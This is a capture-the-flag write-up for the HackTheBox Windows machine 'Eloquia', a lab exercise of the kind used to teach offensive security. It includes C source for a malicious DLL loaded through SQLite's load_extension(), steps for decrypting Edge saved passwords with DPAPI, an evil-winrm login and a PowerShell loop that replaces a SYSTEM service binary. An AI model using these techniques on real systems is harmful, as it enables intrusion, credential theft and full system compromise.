---
title: "Eloquia"
platform: "HackTheBox"
category: "Windows"
difficulty: "Insane"
date: 2025-12-13
os: "Windows Server 2019"
active: true
tags: ["windows", "sqlite", "load_extension", "rce", "dpapi", "edge-browser", "credential-theft", "service-hijacking", "binary-hijacking"]
---

---

## Overview

**Platform:** HackTheBox
**Difficulty:** Insane
**IP:** 10.129.x.x

![Eloquia Banner](/assets/images/ctf/eloquia/banner.png)

Eloquia is a Windows machine featuring two web applications: **Eloquia** (a blog platform) and **Qooqle** (a search engine). The attack chain involves SQLite exploitation, browser credential theft, and service binary hijacking.

---

## Scope

```
Host              IP Address      Operating System        Role
─────────────────────────────────────────────────────────────────────
ELOQUIA           10.129.x.x      Windows Server 2019     Web Server
```

---

## Executive Summary

The engagement identified critical vulnerabilities:

- **SQLite load_extension() enabled** allowing arbitrary DLL loading and RCE
- **Browser saved passwords accessible** via DPAPI decryption from RCE context
- **Insecure file permissions** on service binary allowing replacement
- **Service runs as SYSTEM** enabling privilege escalation via binary hijacking

**Risk Rating:** Critical

---

## Attack Path Overview

```
┌─────────────────────────────────────────────────────────────────┐
│     SQL Explorer → SQLite load_extension() → RCE as WEB        │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│     Edge Browser Profile → DPAPI Decrypt → Olivia.KAT Creds    │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│     WinRM Access → Service Analysis → Binary Write Permissions │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│     Replace Failure2Ban.exe → Service Restart → SYSTEM Shell   │
└─────────────────────────────────────────────────────────────────┘
```

---

# Phase 1: Enumeration

## 1.1 Port Scanning

```bash
nmap -sC -sV -p- 10.129.x.x
```

```
Port      Service         Version
────────────────────────────────────────────────────────
80        HTTP            Microsoft IIS
5985      WinRM           Microsoft HTTPAPI httpd 2.0
47001     WinRM           Microsoft HTTPAPI httpd 2.0
```

**Virtual Hosts Discovered:**
- `eloquia.htb` - Blog platform with Django admin
- `qooqle.htb` - Search engine with OAuth2

## 1.2 Web Application Analysis

The Eloquia application exposes a development SQL Explorer at `/dev/sql-explorer/play/` that allows executing arbitrary SQL queries against a SQLite database.

**Key Finding:** SQLite's `load_extension()` function is enabled.

---

# Phase 2: Initial Foothold - SQLite RCE

## 2.1 Attack Vector

SQLite's `load_extension()` function can load arbitrary DLLs. The DLL must export a function named `sqlite3_<name>_init`.

## 2.2 Malicious DLL Creation

```c
#include <windows.h>
#include <stdlib.h>

__declspec(dllexport) int sqlite3_pwn_init(void *db, char **error, void *api) {
    system("whoami > C:\\Web\\Eloquia\\static\\assets\\images\\blog\\output.txt 2>&1");
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID p) { return TRUE; }
```

Compile with MinGW:

```bash
x86_64-w64-mingw32-gcc -shared -o pwn.dll payload.c
```

## 2.3 Exploitation Chain

1. Upload DLL via article banner feature (file upload)
2. Execute `SELECT load_extension('path/to/dll', 'sqlite3_pwn_init')`
3. Retrieve command output from web-accessible path

**Result:** RCE as `eloquia\web` user

---

# Phase 3: Lateral Movement - Browser Credential Theft

## 3.1 Discovery

The WEB user has a Microsoft Edge browser profile with saved passwords. Since we execute code as WEB, we can decrypt these using DPAPI.

**Edge Password Location:**
```
C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Default\Login Data
```

## 3.2 DPAPI Decryption

Browser passwords are encrypted with AES-GCM using a key protected by Windows DPAPI. Running as the same user allows decryption:

1. Extract encryption key from `Local State` file
2. Decrypt key using `CryptUnprotectData` (DPAPI)
3. Use decrypted key to decrypt saved passwords

**Credentials Recovered:**
```
URL: http://eloquia.htb/accounts/login/
Username: Olivia.KAT
Password: [REDACTED]
```

## 3.3 WinRM Access

```bash
evil-winrm -i eloquia.htb -u Olivia.kat -p '[PASSWORD]'
```

**User Flag:** 8FFE3CCF994EA91BB9C9C34F45ABC42A

---

# Phase 4: Privilege Escalation - Service Binary Hijacking

## 4.1 Service Discovery

The machine runs a custom **Failure2Ban** service that monitors failed login attempts and blocks IPs via Windows Firewall.

**Service Path:**
```
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe
```

## 4.2 Vulnerability

Olivia.KAT has **WRITE** permission on the service executable:

```powershell
icacls "...\Failure2Ban.exe"
# ELOQUIA\Olivia.KAT:(I)(RX,W)
```

The service runs as **LocalSystem (SYSTEM)**.

## 4.3 Exploitation

A scheduled cleanup task periodically restarts the Failure2Ban service. During the brief window when the service stops:

1. Replace `Failure2Ban.exe` with malicious payload
2. Service restarts, executing payload as SYSTEM

```powershell
# Loop to catch the unlock moment
$src = "C:\path\to\payload.exe"
$dst = "C:\...\Failure2Ban.exe"

for ($i=0; $i -lt 600; $i++) {
    try {
        Copy-Item -Path $src -Destination $dst -Force -ErrorAction Stop
        Write-Host "SUCCESS!"
        break
    } catch {
        Start-Sleep -Milliseconds 50
    }
}
```

## 4.4 SYSTEM Shell

```
C:\Windows\system32>whoami
nt authority\system
```

**Root Flag Retrieved!**

---

## Credentials Summary

```
Phase 1-2 - Initial Access
────────────────────────────────────────────────────────────────
admin            : [Web App Admin]      → SQL Explorer access
WEB              : [RCE User]           → SQLite load_extension

Phase 3 - Lateral Movement
────────────────────────────────────────────────────────────────
Olivia.KAT       : [DPAPI Decrypted]    → WinRM access

Phase 4 - Privilege Escalation
────────────────────────────────────────────────────────────────
SYSTEM           : [Binary Hijack]      → Full compromise
```

---

## Tools Used

- **Nmap** - Port scanning and service enumeration
- **MinGW (x86_64-w64-mingw32-gcc)** - Cross-compiling Windows DLLs
- **Python** - Automated exploitation scripts
- **Evil-WinRM** - Remote shell access
- **Netcat** - Reverse shell listener

---

## Key Vulnerabilities

| Vulnerability | Impact | Severity |
|--------------|--------|----------|
| SQLite load_extension() enabled | RCE as WEB user | Critical |
| Browser saved passwords accessible | Lateral movement | High |
| Insecure service binary permissions | Privilege escalation to SYSTEM | Critical |

---

## References

- [SQLite load_extension() Security](https://www.sqlite.org/loadext.html)
- [HackTricks - DPAPI Extracting Passwords](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords)
- [HackTricks - Service Binary Hijacking](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services)
